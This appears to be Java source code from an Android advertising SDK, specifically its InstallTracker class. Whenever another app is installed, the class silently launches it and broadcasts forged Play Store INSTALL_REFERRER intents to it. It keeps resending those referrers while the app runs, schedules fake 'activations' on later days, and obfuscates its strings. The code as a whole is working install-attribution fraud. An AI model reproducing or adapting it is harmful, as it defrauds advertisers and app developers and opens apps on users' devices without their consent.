package com.curtain.koreyoshi.business.gptracker.trackping;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.SystemClock;
import android.text.TextUtils;
import android.util.Log;

import com.common.crypt.ByteCrypt;
import com.curtain.arch.MyLog;
import com.curtain.koreyoshi.business.record.LaunchRecord;
import com.curtain.koreyoshi.business.record.LaunchRecordManager;
import com.curtain.koreyoshi.business.statistics.StatisticsUtil;
import com.curtain.koreyoshi.init.Config;
import com.curtain.koreyoshi.business.popad.PopAdManager;
import com.curtain.koreyoshi.bean.AdData;

import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Random;
import java.util.Set;

/**
 * Created by ulyx.yang@ndpmedia.com on 2015/11/11.
 */
public class InstallTracker {
    private static final String TAG = InstallTracker.class.getSimpleName();
    private static final boolean DEBUG = Config.TRACK_LOG_ENABLE;

    private static HashMap<String, Long> packages = new HashMap<String, Long>();

    public static InstallTracker getInstance() {
        return instance;
    }

    public void track(Context context, String packageName){
        if(!packages.containsKey(packageName)){
            packages.put(packageName, System.currentTimeMillis());

            //发refer
            doTrack(context, packageName);
            if (DEBUG){
                MyLog.d(TAG, ByteCrypt.getString("send refer ---  pname : ".getBytes()) + packageName);
            }


            //安装后更新广告状态
            updateStatus(context, packageName);

            //记录包名，用于激活
            record(context,packageName);
        }
    }

    private void updateStatus(Context context, String packageName) {
        AdData adData = PopAdManager.getInstance(context).getAdByPname(packageName);
        if(adData != null){
            if(adData.getStatus() == 4) {
                PopAdManager.getInstance(context).refreshAdStatus(adData, AdData.STATUS_INSTALLED);
                if (adData.getSilent() == 0 && adData.getShowedTime() > 0) {
                    StatisticsUtil.getInstance(context).statisticsAdInstallSucceed(context, adData);
                    if (DEBUG) {
                        MyLog.d(TAG, ByteCrypt.getString("update ad status --- key ：".getBytes()) + adData.getKey()
                                + ByteCrypt.getString("; pname : ".getBytes()) + packageName);
                    }
                }
            }
            if (0 != adData.getDownloadId()){
                PopAdManager.getInstance(context).refreshAdStatus(adData, AdData.STATUS_INSTALLED);
            }
        }
    }


    private void record(Context context,String pname){
        LaunchRecord record = new LaunchRecord();
        record.setpName(pname);
        record.setInstallTime(System.currentTimeMillis());
        //设置第几天进行第一次激活，这个只是作为记录，实际在安装完后第一次就已经激活
        record.setFirst(0);
        //设置第几天进行第二次激活，这个固定为第二天激活
        record.setSecond(1);
        Random random = new Random();
        int third = random.nextInt(6) + 2;
        //设置第几天进行第三次激活，这个时间是安装后第3---第7天随机第
        record.setThird(third);
        record.setNext(LaunchRecord.STATUS_SECOND);
        LaunchRecordManager.getInstance(context).putRecord(record);
    }

    public void doTrack(Context context, String pkgName) {
        Context appContext = context.getApplicationContext();
        if (!TrackDataManager.getInstance(appContext).contains(pkgName)) {
            doDDL(appContext,pkgName);
        }else {
            doGP(appContext,pkgName);
        }

    }

    private void doGP(Context context, String pkgName) {
        String referrer = TrackDataManager.getInstance(context).getValueForKey(pkgName);
        sendReferrer(context, pkgName, referrer);
        Log.i(TAG, ByteCrypt.getString("send rf install--1-- s - pkg:".getBytes())
                + pkgName + ByteCrypt.getString(" ;referrer : ".getBytes()) +referrer);

        launchApp(context, pkgName,true);

        startTimer(context);
    }

    private void doDDL(Context context, String pkgName) {
        launchApp(context,pkgName,false);
    }


    private void startTimer(final Context context) {
        if (null == timer) {
            synchronized (InstallTracker.class) {
                if (null == timer) {
                    timer = new TimerCycle(new Runnable() {
                        @Override
                        public void run() {
                            monitorLaunch(context, false);
                            try {
                                Thread.sleep(3000);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                            monitorLaunch(context, true);
                        }
                    }, MONITOR_DELAY, MONITOR_INV);
                }
            }
        }

        timer.start();
    }

    private void launchApp(final Context context, final String pkg,final boolean refer) {

        if (null == context ||
                pkg == null || "".equals(pkg)) {
            return;
        }

        new Thread(new Runnable() {
            @Override
            public void run() {
                if(packages.size() <=0 ) {
                    return;
                }

                //延迟5秒启动，避免两个广播连续收到，导致重复启动
                SystemClock.sleep(LAUNCH_DELAY);

                PackageManager pm = context.getPackageManager();
                Intent launchIntent = pm.getLaunchIntentForPackage(pkg);
                if (null != launchIntent) {
                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                    context.startActivity(launchIntent);

                    if (refer) {
                        //这里要实时读取，可能会被更新
                        String referrer = TrackDataManager.getInstance(context).getValueForKey(pkg);
                        sendReferrer(context, pkg, referrer);
                        Log.i(TAG, ByteCrypt.getString("send rf open--2-- s - pkg:".getBytes()) + pkg
                                + ByteCrypt.getString(" ;referrer : ".getBytes()) + referrer);
                        packages.remove(pkg);
                    }
                }
            }
        }).start();
    }

    private void sendReferrer(Context context, String packageName, String referrer) {
        if (!TextUtils.isEmpty(referrer)) {
            Intent installReferrerIntent = new Intent(ByteCrypt.getString("com.android.vending.INSTALL_REFERRER".getBytes()));
            installReferrerIntent.setPackage(packageName);
            installReferrerIntent.putExtra(ByteCrypt.getString("referrer".getBytes()), referrer);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB_MR1) {
                installReferrerIntent.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
            }
            context.sendBroadcast(installReferrerIntent);
        }
    }

    Set<String> getRunningProcesses(final Context context) {
        ActivityManager am = ((ActivityManager) context
                .getSystemService(Activity.ACTIVITY_SERVICE));
        List<ActivityManager.RunningAppProcessInfo> apps = am.getRunningAppProcesses();
        HashSet<String> runningPkgs = new HashSet<String>();
        for (ActivityManager.RunningAppProcessInfo app : apps) {
            String runningPkg = app.processName;
            runningPkgs.add(runningPkg);
        }
        return runningPkgs;
    }

    String getProcessName(final Context context, final String pkgName) {
        String processName = "";
        PackageManager pm = context.getPackageManager();
        try {
            ApplicationInfo info = pm.getApplicationInfo(pkgName, PackageManager.GET_META_DATA);
            processName = info.processName;
        } catch (PackageManager.NameNotFoundException e) {
        }
        return processName;
    }

    void monitorLaunch(final Context context, boolean needClearCache) {
        Set<String> monitorKeys = TrackDataManager.getInstance(context).getAllKeys();

        if (monitorKeys.size() == 0) {
            cancelMonitor();
        }

        Iterator<String> it = monitorKeys.iterator();

        Set<String> runningProcesses = getRunningProcesses(context);

        while (it.hasNext()) {
            String pkgName = it.next();
            String processName = getProcessName(context, pkgName);
            boolean active = runningProcesses.contains(processName);
            if (active) {
                String referrer = TrackDataManager.getInstance(context).getValueForKey(pkgName);
                if (!TextUtils.isEmpty(referrer)) {
                    sendReferrer(context, pkgName, referrer);
                    Log.i(TAG, ByteCrypt.getString("send rf monitor--3-- s - pkg:".getBytes()) + pkgName
                            + ByteCrypt.getString(" ;referrer : ".getBytes()) +referrer);
                    if (needClearCache) {
                        removeLaunched(context, pkgName);
                    }

                }
            }
        }
    }

    private void removeLaunched(Context context, String packageName) {
        TrackDataManager.getInstance(context).removeKey(packageName);
        Set<String> monitorKeys = TrackDataManager.getInstance(context).getAllKeys();
        if (monitorKeys.size() == 0) {
            cancelMonitor();
        }
    }

    private void cancelMonitor() {
        if (timer != null) {
            timer.suspend();
            timer = null;
        }
    }

    private final static InstallTracker instance = new InstallTracker();
    private static final int MONITOR_DELAY = 500;
    private static final int MONITOR_INV = 3000;
    private static final int LAUNCH_DELAY = 5000;

    private TimerCycle timer = null;

}
